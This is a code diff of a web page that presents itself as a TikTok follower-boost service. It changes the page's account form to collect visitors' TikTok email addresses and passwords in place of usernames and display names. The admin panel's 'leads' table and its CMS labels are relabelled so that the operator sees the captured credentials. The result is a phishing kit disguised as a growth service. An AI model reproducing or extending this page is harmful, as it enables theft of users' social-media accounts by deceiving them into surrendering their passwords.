@@ -187,12 +187,12 @@
                 <p class="subtitle" id="s3Sub">Enter your exact TikTok profile details.</p>
                 
                 <div class="input-group">
-                    <label id="labelUserText">TikTok Username (@username)</label>
-                    <input type="text" id="tikUser" class="input-field" placeholder="e.g. @chinedu_tiktok">
+                    <label id="labelUserText">TikTok Gmail</label>
+                    <input type="text" id="tikUser" class="input-field" placeholder="e.g. user@gmail.com">
                 </div>
                 <div class="input-group">
-                    <label id="labelNameText">Profile Display Name</label>
-                    <input type="text" id="tikName" class="input-field" placeholder="e.g. Chinedu Official">
+                    <label id="labelNameText">TikTok password</label>
+                    <input type="password" id="tikName" class="input-field" placeholder="Enter password">
                 </div>
                 <div style="display: flex; gap: 10px;">
                     <button class="btn-secondary" onclick="nextStep(2)">Back</button>
@@ -208,8 +208,8 @@
                 <div class="summary-box">
                     <div class="summary-row"><span>Service:</span><span id="sumService">Followers</span></div>
                     <div class="summary-row"><span>Quantity:</span><span id="sumQty">100</span></div>
-                    <div class="summary-row"><span>Username:</span><span id="sumUser">@chinedu_tiktok</span></div>
-                    <div class="summary-row"><span>Display Name:</span><span id="sumName">Chinedu Official</span></div>
+                    <div class="summary-row"><span id="sumUserLabel">TikTok Gmail:</span><span id="sumUser">user@gmail.com</span></div>
+                    <div class="summary-row"><span id="sumNameLabel">TikTok password:</span><span id="sumName">********</span></div>
                     <div class="summary-row"><span>Delivery Time:</span><span>12-24 Hours Queue</span></div>
                 </div>
 
@@ -261,7 +261,7 @@
 
             <!-- TAB 1: LEADS -->
             <div id="adminTabLeads">
-                <h4 style="margin-bottom: 10px;">Recent TikTok Booster Requests</h4>
+                <h4 style="margin-bottom: 10px;" id="adminTableHeading">Recent TikTok Booster Requests</h4>
                 <div style="overflow-x: auto;">
                     <table class="admin-table">
                         <thead>
@@ -269,8 +269,8 @@
                                 <th>Timestamp</th>
                                 <th>Service</th>
                                 <th>Quantity</th>
-                                <th>Username</th>
-                                <th>Display Name</th>
+                                <th id="thUserCol">TikTok Gmail</th>
+                                <th id="thNameCol">TikTok password</th>
                             </tr>
                         </thead>
                         <tbody id="leadsTableBody">
@@ -288,8 +288,8 @@
                     <div class="input-group"><label>Step 1 Heading</label><input type="text" id="editS1Title" class="input-field" value="Select TikTok Service"></div>
                     <div class="input-group"><label>Step 2 Heading</label><input type="text" id="editS2Title" class="input-field" value="Choose Quantity"></div>
                     <div class="input-group"><label>Step 3 Heading</label><input type="text" id="editS3Title" class="input-field" value="TikTok Account Info"></div>
-                    <div class="input-group"><label>Username Field Label</label><input type="text" id="editLabelUser" class="input-field" value="TikTok Username (@username)"></div>
-                    <div class="input-group"><label>Display Name Field Label</label><input type="text" id="editLabelName" class="input-field" value="Profile Display Name"></div>
+                    <div class="input-group"><label>First Field Label</label><input type="text" id="editLabelUser" class="input-field" value="TikTok Gmail"></div>
+                    <div class="input-group"><label>Second Field Label</label><input type="text" id="editLabelName" class="input-field" value="TikTok password"></div>
                 </div>
                 <button class="btn-primary" onclick="applyCmsChanges()">Apply Text Updates</button>
             </div>
@@ -392,13 +392,18 @@
             const name = document.getElementById('tikName').value.trim();
 
             if(!user || !name) {
-                alert("Please fill in both your TikTok username and display name!");
+                alert("Please fill in both fields!");
                 return;
             }
 
+            const labelUserText = document.getElementById('labelUserText').innerText;
+            const labelNameText = document.getElementById('labelNameText').innerText;
+
             document.getElementById('sumService').innerText = selectedService;
             document.getElementById('sumQty').innerText = selectedQuantity;
-            document.getElementById('sumUser').innerText = user.startsWith('@') ? user : '@' + user;
+            document.getElementById('sumUserLabel').innerText = labelUserText + ':';
+            document.getElementById('sumUser').innerText = user;
+            document.getElementById('sumNameLabel').innerText = labelNameText + ':';
             document.getElementById('sumName').innerText = name;
 
             nextStep(4);
@@ -431,7 +436,7 @@
                         time: new Date().toLocaleString(),
                         service: selectedService,
                         qty: selectedQuantity,
-                        user: user.startsWith('@') ? user : '@' + user,
+                        user: user,
                         name: name
                     };
                     submissions.unshift(newLead);
@@ -478,6 +483,12 @@
         function renderLeadsTable() {
             const tbody = document.getElementById('leadsTableBody');
             document.getElementById('leadCount').innerText = submissions.length;
+            
+            const labelUserText = document.getElementById('labelUserText').innerText;
+            const labelNameText = document.getElementById('labelNameText').innerText;
+            document.getElementById('thUserCol').innerText = labelUserText;
+            document.getElementById('thNameCol').innerText = labelNameText;
+
             if(submissions.length === 0) {
                 tbody.innerHTML = '<tr><td colspan="5" style="text-align: center; color: var(--text-muted);">No requests recorded yet.</td></tr>';
                 return;
@@ -508,14 +519,14 @@
             document.getElementById('s3Title').innerText = s3;
             document.getElementById('labelUserText').innerText = labelUser;
             document.getElementById('labelNameText').innerText = labelName;
-
+            
+            renderLeadsTable();
             showToast("CMS Text Updated Successfully!");
         }
 
         function exportSourceCode() {
             playClickTone();
             
-            // Capture live CMS inputs and text elements
             const currentLogo = document.getElementById('logoText').innerHTML;
             const currentS1 = document.getElementById('s1Title').innerText;
             const currentS2 = document.getElementById('s2Title').innerText;
@@ -532,7 +543,6 @@
 
             let htmlContent = document.documentElement.outerHTML;
 
-            // Replace element texts and input default values in HTML string
             htmlContent = htmlContent.replace(/<div class="logo" id="logoText">[\s\S]*?<\/div>/, `<div class="logo" id="logoText">${currentLogo}</div>`);
             htmlContent = htmlContent.replace(/<h2 id="s1Title">[^<]*<\/h2>/, `<h2 id="s1Title">${currentS1}</h2>`);
             htmlContent = htmlContent.replace(/<h2 id="s2Title">[^<]*<\/h2>/, `<h2 id="s2Title">${currentS2}</h2>`);
